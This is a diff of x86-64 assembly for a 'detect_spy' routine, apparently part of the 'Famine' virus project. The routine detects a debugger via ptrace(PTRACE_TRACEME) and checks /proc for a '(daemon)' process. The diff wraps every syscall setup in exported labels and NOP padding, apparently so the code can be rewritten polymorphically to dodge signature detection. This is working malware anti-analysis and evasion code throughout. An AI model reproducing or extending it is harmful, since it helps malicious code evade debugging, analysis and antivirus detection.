@@ -38,12 +38,35 @@
 section .text
 	global detect_spy
 	global detect_spy_end
+	global lab_ptrace_begin
+	global lab_ptrace_end
+	global lab_proc_begin
+	global lab_proc_end
+	global lab_open_dir_begin
+	global lab_open_dir_end
+	global lab_getdent64_begin
+	global lab_getdent64_end
+	global lab_open_stat_begin
+	global lab_open_stat_end
+	global lab_read_stat_begin
+	global lab_read_stat_end
+	global lab_strstr_begin
+	global lab_strstr_end
+	global lab_close_stat_begin
+	global lab_close_stat_end
+	global lab_close_dir_begin
+	global lab_close_dir_end
+	global lab_close_stat_spy_detected_begin
+	global lab_close_stat_spy_detected_end
+	global lab_close_proc_spy_detected_begin
+	global lab_close_proc_spy_detected_end
 
 detect_spy:
 
 	push rbp
 	mov rbp, rsp
 
+lab_ptrace_begin:
 ;	long	ptrace( PTRACE_TRACEME |  0   | NULL |   0  );
 ;                     |      %rdi      | %rsi | %rdx | %r10 |
 	mov rdi, PTRACE_TRACEME
@@ -51,6 +74,8 @@ detect_spy:
 	mov rdx, ADDR
 	mov r10, DATA
 	mov rax, SYS_PTRACE
+	times 42 db 0x90
+lab_ptrace_end:
 	syscall
 	test rax, rax
 %ifdef DEBUG
@@ -77,14 +102,20 @@ detect_spy:
 after_ptrace:
 
 	sub rsp, 5120			; char path[4096]; char buff_dirent[1024];
+lab_proc_begin:
 	mov r10, 0x00002f636f72702f	; ft_strcpy(path, "/proc/");
+	times 11 db 0x90
+lab_proc_end:
 	mov [rsp + 1024], r10
 
 	; int open( path  | O_RDONLY |;
 	;         | %rdi  |   %rsi   |
 	lea rdi, [rsp + 1024]
+lab_open_dir_begin:
 	mov rsi, O_RDONLY
 	mov rax, SYS_OPEN
+	times 22 db 0x90
+lab_open_dir_end:
 	syscall
 	test rax, rax
 	js spy_detected
@@ -96,8 +127,11 @@ after_ptrace:
 getdents64_loop:
 	mov rdi, [rsp]			; fd
 	lea rsi, [rsp + 16]		; buff_dirent
+lab_getdent64_begin:
 	mov rdx, 1024
 	mov rax, SYS_GETDENTS64
+	times 42 db 0x90
+lab_getdent64_end:
 	syscall
 	cmp rax, 0
 	jle close_no_spy
@@ -144,8 +178,11 @@ browse_dirent_loop:
 	; int open( path | O_RDONLY |;
 	;         | %rdi |   %rsi   |
 	lea rdi, [rsp + 1024 + 48]
+lab_open_stat_begin:
 	mov rsi, O_RDONLY
 	mov rax, SYS_OPEN
+	times 42 db 0x90
+lab_open_stat_end:
 	syscall
 	test rax, rax
 	js pop_next_file
@@ -156,17 +193,23 @@ browse_dirent_loop:
 	sub rsp, 40			; char buff_stat[SIZE_BUFF_STAT];
 	mov rdi, rax
 	mov rsi, rsp
+lab_read_stat_begin:
 	mov rdx, SIZE_BUFF_STAT
 	mov rax, SYS_READ
+	times 22 db 0x90
+lab_read_stat_end:
 	syscall
 	test rax, rax
 	js close_stat
 
 	; if (ft_strstr(buff_stat, target_process))
 		; {famine_close(fd); return true;}
+lab_strstr_begin:
 	mov rax, 40			; '('
-	mov rdi, rsp
 	mov rcx, 32
+	times 22 db 0x90
+lab_strstr_end:
+	mov rdi, rsp
 	cld
 	repnz scasb
 	cmp DWORD [rdi], 0x6d656164	; ft_strstr(buff_stat, "(daemon)");
@@ -179,7 +222,10 @@ close_stat:
 	; int close(  fd )
 	;          | rdi |
 	pop rdi				; fd
+lab_close_stat_begin:
 	mov rax, SYS_CLOSE
+	times 22 db 0x90
+lab_close_stat_end:
 	syscall
 
 pop_next_file:
@@ -196,7 +242,10 @@ close_no_spy:
 	; int close(  fd )
 	;          | rdi |
 	mov rdi, [rsp]			; fd
+lab_close_dir_begin:
 	mov rax, SYS_CLOSE
+	times 22 db 0x90
+lab_close_dir_end:
 	syscall
 	xor rax, rax
 	leave
@@ -204,10 +253,16 @@ close_no_spy:
 
 close_stat_proc_spy_detected:
 	mov rdi, [rsp + 40]
+lab_close_stat_spy_detected_begin:
 	mov rax, SYS_CLOSE
+	times 22 db 0x90
+lab_close_stat_spy_detected_end:
 	syscall
 	mov rdi, [rsp + 80]
+lab_close_proc_spy_detected_begin:
 	mov rax, SYS_CLOSE
+	times 22 db 0x90
+lab_close_proc_spy_detected_end:
 	syscall
 
 spy_detected:
